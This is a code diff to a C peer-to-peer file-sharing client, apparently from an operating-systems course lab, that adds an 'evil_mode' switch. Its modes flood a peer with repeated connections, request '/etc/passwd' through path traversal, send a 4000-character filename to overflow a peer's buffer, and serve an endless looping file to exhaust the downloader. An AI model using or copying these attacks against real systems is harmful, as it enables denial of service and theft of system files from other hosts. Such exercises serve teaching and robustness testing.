@@ -586,11 +586,37 @@ static void task_download(task_t *t, task_t *tracker_task)
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+
+	while(evil_mode == 4){
+	  t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	  if (t->peer_fd == -1) {
+		error("* Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	  }
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	  // task_free(t);
+	}
+	
 	if (t->peer_fd == -1) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	  
+	if(evil_mode == 3)
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/etc/passwd");
+	else if (evil_mode == 2){
+	  char* name = malloc(4000*sizeof(char*));
+	  int i = 0;
+	  for(i = 0; i < 3999; i++){
+	    name[i] = 'A';
+	  }
+	  name[3999] = '\0';
+
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", name);
+	  
+	} else
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -738,7 +764,7 @@ static void task_upload(task_t *t)
 	//	error("* Odd request %.*s\n", t->tail, t->buf);
 	//	goto exit;
 	//}
-	if(!evil_mode){
+	if(!(evil_mode == 1)){
 	  if (osp2p_snscanf(t->buf, FILENAMESIZ + 11 - 1, "GET %s OSP2P\n", t->filename) < 0) { 
 	    error("* Odd request %.*s\n", t->tail, t->buf);
 	    goto exit;
@@ -756,13 +782,9 @@ static void task_upload(task_t *t)
 	  goto exit;
 	}
 
-	if(!evil_mode)
+	if(!(evil_mode==1))
 	  t->disk_fd = open(t->filename, O_RDONLY);
 	else{
-	// fan's test for hung
-	//	while(1) 
-	//		continue ;
-	// Results: so our osppeer will just come back to us and say that the read was empty
 	  t->disk_fd = open("../rick.txt", O_RDONLY);
 	  printf("%d\n", t->disk_fd);
 	}
@@ -785,11 +807,11 @@ static void task_upload(task_t *t)
 		if (ret == TBUF_ERROR) {
 			error("* Disk read error");
 			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail && !evil_mode){
+		} else if (ret == TBUF_END && t->head == t->tail && !(evil_mode==1)){
 			/* End of file */
 			break;
 		}
-		else if (ret == TBUF_END && t->head == t->tail && evil_mode){
+		else if (ret == TBUF_END && t->head == t->tail && (evil_mode==1)){
 		  lseek(t->disk_fd,0,SEEK_SET);
 		}
 	}
